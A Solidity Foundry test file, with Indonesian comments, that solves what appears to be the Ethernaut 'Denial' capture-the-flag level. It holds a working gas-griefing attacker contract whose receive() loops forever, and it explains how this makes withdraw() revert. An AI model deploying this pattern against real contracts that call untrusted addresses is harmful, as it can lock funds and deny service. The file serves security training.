// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Denial} from "src/levels/Denial.sol";
import {DenialFactory} from "src/levels/DenialFactory.sol";

// withdraw() mengirim 1% ke partner lewat low-level call (tanpa cek
// return) lalu 1% ke owner via transfer. Partner yang menghabiskan
// SELURUH gas membuat withdraw() revert kehabisan gas — validasi
// factory mensyaratkan withdraw() revert.
// PENTING: assert(false) di Solidity 0.8 adalah REVERT Panic yang
// MENGEMBALIKAN gas (bukan INVALID opcode 0xfe seperti <0.8) — jadi
// assert tidak cukup. Yang dibutuhkan adalah loop tak berujung yang
// benar-benar membakar gas (aturan 63/64: partner mendapat ~984k dari
// 1M gas; sisanya ~15,6k di pemanggil tidak cukup untuk transfer +
// 2× SSTORE di sisa withdraw()).
contract DenialAttack {
    uint256 public counter;

    receive() external payable {
        while (true) {
            counter++;
        }
    }
}

contract DenialSolve is Test {
    DenialFactory factory;
    Denial instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new DenialFactory();
        vm.deal(address(this), 10 ether);
        instance = Denial(payable(factory.createInstance{value: 0.001 ether}(player)));
    }

    function testInit() public {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        DenialAttack attack = new DenialAttack();
        instance.setWithdrawPartner(address(attack));
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
